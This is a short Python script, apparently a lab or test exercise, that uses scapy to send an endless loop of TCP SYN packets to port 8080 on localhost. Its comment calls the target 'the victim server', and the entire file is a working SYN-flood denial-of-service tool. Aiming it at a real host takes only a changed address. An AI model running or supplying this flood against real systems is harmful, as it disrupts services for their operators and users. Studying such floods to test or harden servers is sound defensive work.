from scapy.all import IP, TCP, send
import time

def start_flood():
    print("Flooding 127.0.0.1:8080 with SYN packets...")
    while True:
        # Targeting the victim server on port 8080
        packet = IP(dst="127.0.0.1")/TCP(dport=8080, flags="S")
        send(packet, verbose=False)
        time.sleep(0.01) # High frequency

start_flood()